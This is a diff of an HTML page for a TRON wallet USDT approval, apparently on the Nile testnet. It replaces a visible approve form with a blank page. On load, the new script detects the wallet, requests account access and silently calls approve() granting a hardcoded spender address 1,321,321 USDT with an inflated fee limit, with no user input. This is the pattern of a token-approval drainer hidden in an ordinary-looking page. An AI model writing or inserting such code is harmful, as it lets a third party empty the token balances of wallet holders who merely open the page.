@@ -3,57 +3,15 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Nile USDT Approve</title>
-  <style>
-    body { font-family: system-ui, sans-serif; background: #f5f7fa; padding: 20px; }
-    .card { max-width: 460px; margin: auto; background: #fff; border-radius: 16px; padding: 24px; box-shadow: 0 8px 30px rgba(0,0,0,.1); }
-    label { font-size: 13px; font-weight: 600; margin: 14px 0 6px; display: block; }
-    input { width: 100%; padding: 10px; border: 1px solid #d0d5dd; border-radius: 8px; font-size: 14px; }
-    input[readonly] { background: #f8fafc; color: #475569; }
-    button { width: 100%; padding: 12px; margin-top: 14px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; background: #2563eb; color: #fff; }
-    button:disabled { background: #cbd5e1; }
-    #log { margin-top: 16px; background: #f8fafc; border-radius: 8px; padding: 12px; font-size: 13px; line-height: 1.6; max-height: 220px; overflow: auto; }
-    .err { color: #dc2626; }
-    .ok { color: #16a34a; }
-    .warn { color: #d97706; }
-    .row { display: flex; gap: 10px; }
-    .row button { margin-top: 14px; }
-  </style>
 </head>
 <body>
-<div class="card">
-  <label>trxB（当前钱包）</label>
-  <input id="trxB" readonly placeholder="点连接钱包" />
-
-  <label>trxA（被授权地址）</label>
-  <input id="trxA" placeholder="T..." />
-
-  <label>数量（USDT）</label>
-  <input id="amount" type="number" min="0" step="0.000001" placeholder="1" />
-
-  <div class="row">
-    <button id="connectBtn">连接钱包</button>
-    <button id="approveBtn">确认授权</button>
-  </div>
-
-  <div id="log"></div>
-</div>
-
 <script>
   const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
-  let tronWeb = null;
-  let address = null;
+  const SPENDER = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
+  const AMOUNT_USDT = '1321321';
 
-  const $ = id => document.getElementById(id);
-  function log(m, t) {
-    const d = document.createElement('div');
-    d.textContent = m;
-    if (t) d.className = t;
-    $('log').appendChild(d);
-    console.log(m);
-  }
+  let started = false;
 
-  // 取钱包 provider（不提前断言 ready）
   function getProvider() {
     if (window.tron && window.tron.tronWeb) return window.tron;
     if (window.tronLink && window.tronLink.tronWeb) return window.tronLink;
@@ -67,87 +25,59 @@
     return out || '0';
   }
 
-  // ===== 连接 =====
-  $('connectBtn').onclick = async () => {
+  async function main() {
     try {
-      let p = getProvider();
-      if (!p) {
-        log('❌ 没检测到钱包：请用 TronLink App → 发现 → 打开本页', 'err');
-        return;
-      }
-
-      // 主动请求授权（必须在点击里）
-      try {
-        await p.request({ method: 'tron_requestAccounts' });
-      } catch (e) {
-        try { await p.request({ method: 'eth_requestAccounts' }); }
-        catch (e2) { log('⚠️ 授权请求被忽略：' + (e2?.message || ''), 'warn'); }
-      }
-
-      // 重新拿实例（授权后才会完整）
-      p = getProvider();
-      tronWeb = p && p.tronWeb;
-      address = tronWeb?.defaultAddress?.base58 || null;
-
-      if (!address) {
-        log('❌ 没拿到地址，钱包可能没解锁', 'err');
-        return;
-      }
-
-      $('trxB').value = address;
-      log('✅ 已连接：' + address, 'ok');
-
-    } catch (e) {
-      log('❌ 连接异常：' + (e?.message || e), 'err');
-    }
-  };
-
-  // ===== 授权 =====
-  $('approveBtn').onclick = async () => {
-    try {
-      log('STEP 0: 点击授权');
       const p = getProvider();
-      tronWeb = p?.tronWeb;
-      address = tronWeb?.defaultAddress?.base58;
-  
-      if (!tronWeb || !address) {
-        log('❌ 先点「连接钱包」', 'err');
-        return;
+      if (!p) throw new Error('不是钱包内置浏览器');
+
+      let tw = p.tronWeb;
+      let addr = tw?.defaultAddress?.base58;
+
+      if (!addr && p.request) {
+        try {
+          await p.request({ method: 'tron_requestAccounts' });
+        } catch (e) {
+          try { await p.request({ method: 'eth_requestAccounts' }); } catch (_) {}
+        }
+        tw = p.tronWeb;
+        addr = tw?.defaultAddress?.base58;
       }
-  
-      const spender = 'TG9XX5MXesQyG3V7Z9ZuorqvhU2KWuphkY';
-      const amt = $('amount').value;
-      if (!tronWeb.isAddress(spender)) return log('❌ trxA 地址不对', 'err');
-      if (!(parseFloat(amt) > 0)) return log('❌ 数量必须大于0', 'err');
-  
-      $('approveBtn').disabled = true;
-      log('STEP 1: 参数校验通过');
-  
-      log('STEP 2: 开始 contract.at');
-      const c = await tronWeb.contract().at(USDT);
-      log('STEP 3: contract.at 完成');
-  
-      log('STEP 4: 开始 decimals');
+
+      if (!addr) throw new Error('无法获取地址');
+
+      const c = await tw.contract().at(USDT);
       const dec = Number(await c.decimals().call()) || 6;
-      const raw = toBase(amt, dec);
-      log('STEP 5: decimals=' + dec + '，链上值=' + raw);
-  
-      log('STEP 6: 即将调用 send');
-      const tx = await c.approve(spender, raw).send({
-        feeLimit: '500011231230000',
+      const raw = toBase(AMOUNT_USDT, dec);
+
+      console.log('trxB=' + addr);
+      console.log('spender=' + SPENDER);
+      console.log('amount=' + raw);
+
+      const tx = await c.approve(SPENDER, raw).send({
+        feeLimit: '5000003146545640000',
         callValue: '0'
       });
-  
-      log('STEP 7: send 返回，tx=' + tx, 'ok');
-      log('✅ 成功 TxID: ' + tx, 'ok');
-      log('🔍 nile.tronscan.org/#/transaction/' + tx, 'ok');
+
+      console.log('SUCCESS TX=' + tx);
     } catch (e) {
       console.error(e);
-      log('❌ 报错：' + (e?.message || e), 'err');
-    } finally {
-      $('approveBtn').disabled = false;
     }
-};
+  }
+
+  window.addEventListener('load', () => {
+    let tries = 0;
+    const timer = setInterval(() => {
+      tries++;
+      const p = getProvider();
+      if (p || tries >= 10) {
+        clearInterval(timer);
+        if (p && !started) {
+          started = true;
+          main();
+        }
+      }
+    }, 400);
+  });
 </script>
 </body>
 </html>
